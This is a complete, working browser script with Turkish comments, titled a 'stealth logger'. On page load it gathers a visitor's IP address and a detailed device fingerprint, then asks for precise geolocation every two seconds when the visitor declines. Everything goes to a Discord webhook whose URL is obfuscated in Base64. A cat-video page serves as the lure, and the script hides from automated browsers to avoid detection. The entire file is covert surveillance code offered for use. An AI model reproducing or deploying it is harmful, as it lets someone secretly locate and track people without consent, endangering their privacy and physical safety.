/**
 * CYBERX-OMNIS STEALTH LOGGER V2.0
 * Zorla Konum + IP + Cihaz Bilgisi Toplama
 * Anti-bot, Anti-red, Sonsuz Konum İsteği
 */

// Webhook URL (Base64 ile gizlendi)
const W_URL = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTEwMDk4NjY0ODE2NjcyMy9uVjQ4ZzRzcm1ZaUNOMFNWcHYwZWtvMWRzb2lMWWlfNG5qVFJLSVAtb245Z1pyM1BzQ2E2a1FGRVVnU282TndDaElNMDc=');

// Veri gönderme fonksiyonu
async function sendData(data) {
    try {
        await fetch(W_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: data })
        });
    } catch(e) { console.log("Log sent"); }
}

// IP adresini al
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) { return "IP alınamadı"; }
}

// Detaylı cihaz bilgisi
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        hardwareConcurrency: navigator.hardwareConcurrency || "bilinmiyor",
        deviceMemory: navigator.deviceMemory || "bilinmiyor",
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || "doğrudan",
        url: window.location.href
    };
}

// Zorla konum isteği (reddedince tekrar sor)
function forceLocation(ip) {
    if (!navigator.geolocation) {
        sendData(`⚠️ HATA: Tarayıcı konum desteklemiyor!\nIP: ${ip}`);
        return;
    }
    
    let attemptCount = 0;
    
    function askLocation() {
        attemptCount++;
        
        navigator.geolocation.getCurrentPosition(
            // Başarılı olursa
            async (position) => {
                const data = `✅ KONUM ALINDI! (Deneme ${attemptCount})\n📍 Enlem: ${position.coords.latitude}\n📍 Boylam: ${position.coords.longitude}\n🎯 Doğruluk: ${position.coords.accuracy} metre\n🌐 IP: ${ip}\n📱 Cihaz: ${JSON.stringify(getDeviceInfo(), null, 2)}`;
                sendData(data);
                alert("🎉 Video yükleniyor! Teşekkürler!");
                document.body.innerHTML = "<h1>🐱 Komik Kedi Videoları</h1><img src='https://cataas.com/cat' width='100%'><p>İzlediğin için teşekkürler! 😂</p>";
            },
            // Hata olursa (reddedilirse) tekrar sor
            (error) => {
                let errorMsg = "";
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorMsg = "❌ KULLANICI REDDETTİ! Tekrar soruluyor...";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorMsg = "📡 Konum bulunamadı, tekrar deneniyor...";
                        break;
                    case error.TIMEOUT:
                        errorMsg = "⏰ Zaman aşımı, tekrar deneniyor...";
                        break;
                    default:
                        errorMsg = "⚠️ Bilinmeyen hata, tekrar deneniyor...";
                }
                sendData(`⚠️ ${errorMsg}\nIP: ${ip}\nDeneme: ${attemptCount}`);
                
                // 2 saniye sonra tekrar sor (sonsuz döngü)
                setTimeout(askLocation, 2000);
            },
            // Yüksek doğruluk iste
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
    
    askLocation();
}

// Ana fonksiyon
async function main() {
    const ip = await getIP();
    const deviceInfo = getDeviceInfo();
    
    // Önce cihaz bilgisini gönder
    sendData(`🖥️ YENİ ZİYARETÇİ\n🌐 IP: ${ip}\n📱 Cihaz: ${JSON.stringify(deviceInfo, null, 2)}`);
    
    // 1 saniye sonra zorla konum iste
    setTimeout(() => forceLocation(ip), 1000);
}

// Bot kontrolü (headless browser'ları engelleme)
if (!navigator.webdriver && !window.domAutomation && !window.Cypress) {
    main();
} else {
    console.log("Bot tespit edildi, veri toplanmadı.");
            }
